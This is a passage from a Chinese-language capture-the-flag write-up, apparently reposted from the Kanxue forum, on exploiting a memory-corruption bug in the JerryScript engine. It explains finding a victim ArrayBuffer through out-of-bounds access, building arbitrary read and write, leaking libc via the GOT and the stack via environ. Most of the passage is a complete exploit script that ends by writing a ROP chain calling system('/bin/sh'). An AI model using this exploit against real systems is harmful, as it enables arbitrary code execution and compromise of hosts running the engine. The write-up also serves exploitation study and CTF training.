确定受害arraybuffer的思路是也很清晰，我这里已经可以越界读定位到受害arraybuffer的header，所以可以通过越界写修改arraybuffer的byteLength字段，然后遍历所有的arraybuffer来检查哪一个对象的byteLength被修改了，至此我们已经可以准确定位arraybuffer了。  
  
  
定位到arraybuffer，下面的任意读写就是修改buffer_p字段，然后调用dataview的get/set方法即可。  
## 避免gc回收  
  
这里是为了提高任意读写的稳定性，如何笔者发现完成一次任意读写这里就会触发gc移动，如果此时的buffer_p是一个gc无法回收的地址，那么就会程序崩溃，所以解决思路也很简单，任意读写完毕之后，把原本的buffer_p再修改回去。  
  
  
同时，为了防止原本布置的victim对象被gc回收，可以通过如下方式增加ref count  
  
```
function MakeRef(){return [vic_dv_array];}
```  
  
  
  
也可以通过上面笔者提到的思路，直接利用越界去修改ref count的值，这样也可以  
## 泄漏libc    
  
存在任意读写之后，可以通过读jerry_global_heap段开头的一些handler函数的值，确定code base的值，从而定位到got，然后泄漏位于libc中函数的值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K20eQQ3ERsFIaHk6YxjNhaEk2Z1iblrr93FFdpOQ42bnhjZ94KzhEdRUBbGsmjU3u2fIfNw6djxZ3UEB6Cic1dcOUEumewg4mvPI/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
## getshell  
  
这里笔者由于很久没有接触house of打法，已经不知道2.39应该怎么做了，所以这里采用了通过environ泄漏栈地址的方式，然后劫持main函数的返回地址，实现rop。  
  
  
**exploit**  
  
  
  
  
```
varbuf =new ArrayBuffer(8);varf32 =new Float32Array(buf);varf64 =new Float64Array(buf);varu8 =new Uint8Array(buf);varu16 =new Uint16Array(buf);varu32 =new Uint32Array(buf);varu64 =new BigUint64Array(buf);function lh_u32_to_f64(l,h){    u32[0] = l;    u32[1] = h;return f64[0];}function f64_to_u32l(val){    f64[0] = val;return u32[0];}function f64_to_u32h(val){    f64[0] = val;return u32[1];}function f64_to_u64(val){    f64[0] = val;return u64[0];}function u64_to_f64(val){    u64[0] = val;return f64[0];}function u64_to_u32_lo(val){    u64[0] = val;return u32[0];}function u64_to_u32_hi(val){    u64[0] = val;return u32[1];}function logg(name, addr) {    print("[+] " + name + ": 0x" + addr.toString(16));}letgrooming = [];function gc() {    print("[*] GC initiated");for (leti =0; i < 200; i++) {        grooming.push(new ArrayBuffer(0x100));    }    print("[*] GC completed");}function spin() {while (1) {}}function inin_dv(arr,arr_length,ab_length){for(let i=0; i<arr_length; i++) {        arr.push(new DataView(new ArrayBuffer(ab_length)));    }for (let i=0; i<arr_length; i++) {        arr[i].setFloat64(0, u64_to_f64(MagicSign), true);     }return arr;}function getType(val){return (val) & 0xffn;}function getByteLength(val){return (val >> 32n) & 0xffffffffn;}function getProtoType(val){return (val) & 0xffffffffn;}function find_victim_ab_idx(oob_dv,feature){/*let feature = [0x940000200c0012n,0x100000000319n];pwndbg> x/4wx 0x57086ef863000x57086ef86300 <jerry_global_heap+65664>:  0x200c0012  0x00940000  0x00000319  0x00001000pwndbg> x/4wx 0x57086ef863400x57086ef86340 <jerry_global_heap+65728>:  0x20140012  0x00940000  0x00000319  0x00001000pwndbg> */    print("[*] find_victim_ab_idx");letTypes = getType(feature[0]);letProtoType = getProtoType(feature[1]);letByteLength = getByteLength(feature[1]);letval = [];for (leti =0; i < 0x5000; i++) {        val[0] = f64_to_u64(oob_dv.getFloat64(i*8, true));if (getType(val[0]) == Types){            val[1] = f64_to_u64(oob_dv.getFloat64((i+1)*8, true));if (getProtoType(val[1]) == ProtoType && getByteLength(val[1]) == ByteLength){                target_idx = i + 2;                logg("target_idx: ",target_idx);return target_idx;            }        }    }return -1;}function find_corrupt_dv(oob_dv, dv_arr){    print("[*] find_corrupt_dv");letlen_offset = (target_idx -1 ) * 8 + 4;letmaigc =0x41414141;letoriginal_length = (oob_dv.getUint32(len_offset, true));    logg("original length: ", original_length);    oob_dv.setUint32(len_offset, maigc, true);letlength = -1;for(let i=0; i<dv_arr.length; i++){        length = dv_arr[i].buffer.byteLength;// print("length: 0x" + length.toString(16));if(length == maigc){            logg("Found corrupted dv at index: ", i);            oob_dv.setUint32(len_offset, original_length, true);return i;        }    }       print("[-] Failed to find corrupted dv");return -1;}function read64(addr){letlo = -1;lethi = -1;letorig = f64_to_u64(dv.getFloat64(target_idx * 8, true));// print("orig: 0x" + orig.toString(16));    dv.setUint32(target_idx * 8, Number(addr & 0xffffffffn), true);    dv.setUint32(target_idx * 8 + 4, Number((addr >> 32n) & 0xffffffffn), true);    lo = vic_dv_array[corrupt_idx].getUint32(0, true);    hi = vic_dv_array[corrupt_idx].getUint32(4, true);letret = (BigInt(hi) << 32n) | BigInt(lo);    dv.setFloat64(target_idx * 8, u64_to_f64(orig), true);// print("orig: 0x" + orig.toString(16));return ret;}function write32(addr, value){letlo = -1;lethi = -1;letorig = f64_to_u64(dv.getFloat64(target_idx * 8, true));    dv.setUint32(target_idx * 8, Number(addr & 0xffffffffn), true);    dv.setUint32(target_idx * 8 + 4, Number((addr >> 32n) & 0xffffffffn), true);    vic_dv_array[corrupt_idx].setUint32(0, Number(value & 0xffffffffn), true);    dv.setFloat64(target_idx * 8, u64_to_f64(orig), true);}function write64(addr, value){letlo = -1;lethi = -1;letorig = f64_to_u64(dv.getFloat64(target_idx * 8, true));    dv.setUint32(target_idx * 8, Number(addr & 0xffffffffn), true);    dv.setUint32(target_idx * 8 + 4, Number((addr >> 32n) & 0xffffffffn), true);    vic_dv_array[corrupt_idx].setUint32(0, Number(value & 0xffffffffn), true);    vic_dv_array[corrupt_idx].setUint32(4, Number((value >> 32n) & 0xffffffffn), true);    dv.setFloat64(target_idx * 8, u64_to_f64(orig), true);}function TestPrimitive(){    print("[*] TestPrimitive");letorig = read64(heap_global_addr);    logg("orig: ", orig);    write64(heap_global_addr, 0x4444444444444444n);letnew_val = read64(heap_global_addr);    logg("new_val: ", new_val);    print("[*] TestPrimitive completed");}function MakeRef(){return [vic_dv_array];}function InitExploit(version){    print("[*] InitExploit");if (version == 1) {// 题目下发版本return [            0x78n,   // handler_offset            0x5648fn,   // code_offset            0x70de0n,   // got_offset            0x86710n,   // libc_offset            0x20ad58n,            0x58750n,        ];    } else {// 自己编译版本return [            0x158n,   // handler_offset            0xd0815n,   // code_offset            0x11add0n,  // got_offset            0x606f0n,   // libc_offset            0x3f3000n,            0n,        ];    }}gc();letInitSign = 0x1111111111111111n;letMagicSign = 0x4141414142424242n;letconfuse_length =0xffffffff;lettarget_idx =0x130;letab_array = [];for(let i=0; i<10; i++) ab_array.push(new ArrayBuffer(0x20));letab = ab_array[9];letdv =new DataView(ab, NaN, confuse_length);dv.setFloat64(0, u64_to_f64(InitSign), true); letvic_dv_array = []vic_dv_array = inin_dv(vic_dv_array ,100 ,0x1000);target_idx = find_victim_ab_idx(dv, [0x940000200c0012n,0x100000000319n]);// describe(dv);// describe(vic_dv_array[99]);letptr_lo = dv.getUint32(target_idx * 8, true);letptr_hi = dv.getUint32(target_idx * 8 + 4, true);letheap_global_addr = (BigInt(ptr_hi) << 32n) | BigInt(ptr_lo);heap_global_addr = heap_global_addr - 0x11058n;heap_global_addr = heap_global_addr & ~ 0xfffn;// // 题目下发版本的偏移heap_global_addr = heap_global_addr + 0x280n;// heap_global_addr = heap_global_addr - 0x9000n + 0x280n;logg("heap_global_addr: ", heap_global_addr);letcorrupt_idx = find_corrupt_dv(dv, vic_dv_array);letkeep_alive = MakeRef();letversion =1; // 0: 自己编译版本, 1: 题目下发版本let [handler_offset,code_offset, got_offset, libc_offset,    environ_offset,system_offset] = InitExploit(version);letcode_base = read64(heap_global_addr+handler_offset)-code_offset;letgot_func = code_base + got_offset;letlibc_base = read64(got_func)-libc_offset;letsystem = libc_base + system_offset;letenviron_addr = libc_base + environ_offset;letstack = read64(environ_addr)-0x138n;letret = code_base + 0x0002552en;letpop_rdi_ret = code_base + 0x00059279n;letpop_rsi_ret = code_base + 0x000595d6n;letpop_rdx_ret = code_base + 0x00056f1dn;letbinsh = libc_base + 0x1cb42fn;logg("pop_rdi_ret: ", pop_rdi_ret);logg("pop_rsi_ret: ", pop_rsi_ret);logg("pop_rdx_ret: ", pop_rdx_ret);logg("binsh: ", binsh);logg("system: ", system);logg("code_base: ", code_base);logg("got_func: ", got_func);logg("libc_base: ", libc_base);logg("environ_addr: ", environ_addr);logg("stack: ", stack);write64(stack, ret);write64(stack+8n, pop_rdi_ret);write64(stack+16n, binsh);write64(stack+24n, pop_rsi_ret);write64(stack+32n, 0n);write64(stack+40n, pop_rdx_ret);write64(stack+48n, 0n);write64(stack+56n, system);write64(stack+64n, 0n);// TestPrimitive();// spin();
```  
  
  
  
本地测试时堆地址会在这两个之前变化，一个没打通试另外一个就可以了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K0IGl5KibgZGibcU0wB3MFJS6myzMvaOa97TgrKGxk02P4iczA7vLQpqYZM1I2Cmia7tZIkSY67QDK6mfLDIOb5mV8Wg9jurS3TI08/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
成功则会有如下显示  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K0BYs8bVc0rk8OJnwicb8VicCdORumTJGB1kLtHHyE5MCveicLNzsxYW5zcnp2VGhg8ONJrb3HtbMUtSYnP7NMib2jTdZd39Xk0CFw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR1Sp5M6ESc99fWQUnvic6LLo71icsHHFpO4lnS5Wnb14zf9SLybqVIfYA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
看雪ID：  
flyyyy  
  
https://bbs.kanxue.com/user-home-971428.htm  
  
*本文为看雪论坛精华文章，由   
flyyyy  
   
原创，转载请注明来自看雪社区  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458608775&idx=1&sn=7c7b03e3bb8ec5c26e42682a395478ce&scene=21#wechat_redirect)  
  
第十届安全开发者峰会-议题征集开启  
  
  
# 往期推荐  
  
[[PWN] Linux中的pkeys安全机制及绕过](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458609014&idx=1&sn=3e33084304fad678da056968ee8b950f&scene=21#wechat_redirect)  
  
  
[PageCache详细分析(读写/写回) 基于 Linux 6.12.32版本](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458608994&idx=1&sn=4b7864d52ec24a4ac6a4a701a53b2c94&scene=21#wechat_redirect)  
  
  
[fnOS路径穿越与命令执行漏洞利用分析](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458608987&idx=1&sn=eb20b7a211d3d0a14aee4d810d146e57&scene=21#wechat_redirect)  
  
  
[深入浅出 Android Hook 技术：Frida 框架入门系列](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458608939&idx=1&sn=1f40272488c196228ffd477b34e89d34&scene=21#wechat_redirect)  
  
  
[强网杯S9 Real World - monotint](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458608873&idx=1&sn=6847c40b551141a8d7a336c01ee7b5c7&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3E2p53BdFIKZQeLIjUh4DlwOSn0icZN8TT8yB3icfVhrWNuicdUGFia3AJNATldfQCPyoK02vSRzAyuiaJ35aC8UBgfbtES5lDt4pc/640?wx_fmt=png&from=appmsg "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpUHZDmkBpJ4khdIdVhiaSyOkxtAWuxJuTAs8aXISicVVUbxX09b1IWK0g/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
